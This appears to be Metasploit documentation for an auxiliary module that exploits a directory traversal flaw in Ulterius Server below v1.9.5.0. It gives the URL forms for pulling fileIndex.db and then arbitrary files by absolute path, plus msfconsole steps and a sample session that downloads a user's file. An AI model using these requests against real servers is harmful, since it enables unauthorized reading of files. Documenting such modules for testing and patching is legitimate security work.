## Description

This module exploits a directory traversal vulnerability in [Ulterius Server < v1.9.5.0](https://github.com/Ulterius/server/releases). The directory traversal flaw occurs in Ulterius Server's `HttpServer.Process` function call. While processing file requests, the `HttpServer.Process` function does not validate that the requested file is within the web server's root directory or a subdirectory.

## Vulnerable Application

When requesting a file, a relative or absolute file path is needed so the appropriate request can be generated. Fortunately, Ulterius Server creates a file called `fileIndex.db`, which contains filenames and directories located on the server. By requesting `fileIndex.db` and parsing the retrieved data, absolute file paths can be retrieved for files hosted on the server. Using the information retrieved from parsing `fileIndex.db`, additional requests can be generated to download desired files.

As noted in the [EDB PoC](https://www.exploit-db.com/exploits/43141/), the `fileIndex.db` is usually located at:

`http://ulteriusURL:22006/.../fileIndex.db`

Note: 22006 was the default port after setting up the Ulterius Server.

After retrieving absolute paths for files, the files can be retrieved by sending requests of the form:

`http://ulteriusURL:22006/<DriveLetter>:/<path>/<to>/<file>`

Note: The [EDB PoC](https://www.exploit-db.com/exploits/43141/) used relative paths to download files but absolute paths can be used on Windows-platforms as well, because the `HttpServer.Process` function made use of the [Path.Combine](https://msdn.microsoft.com/en-us/library/fyy7a5kt(v=vs.110).aspx) function.

> If *path2* includes a root, *path2* is returned. 

## Options

**PATH**

This option specifies the absolute or relative path of the file to download. (default: `/…/fileIndex.db`)

Note: If you are using relative paths, use three periods when traversing down a level in the directory structure. If absolute paths are used, make sure to include the drive letter.

## Verification Steps

- [ ] Install Ulterius Server < v1.9.5.0
- [ ] `./msfconsole`
- [ ] `use auxiliary/admin/http/ulterius_file_download`
- [ ] `set rhost <rhost>`
- [ ] `run`
- [ ] Verify loot contains file system paths from remote file system.
- [ ] `set path '<DriveLetter>:/<path>/<to>/<file>'`
- [ ] `run`
- [ ] Verify contents of file

## Scenarios

### Ulterius Server v1.8.0.0 on Windows 7 SP1 x64.

```
msf5 > use auxiliary/admin/http/ulterius_file_download
msf5 auxiliary(admin/http/ulterius_file_download) > set rhost 172.22.222.122
rhost => 172.22.222.122
msf5 auxiliary(admin/http/ulterius_file_download) > run

[*] Starting to parse fileIndex.db...
[*] Remote file paths saved in: filepath0
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/ulterius_file_download) > set path 'C:/users/pwnduser/desktop/tmp.txt'
path => C:/users/pwnduser/desktop/tmp.txt
msf5 auxiliary(admin/http/ulterius_file_download) > run

[*] C:/users/pwnduser/desktop/tmp.txt
[*] File contents saved: filepath1
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/ulterius_file_download) >
```
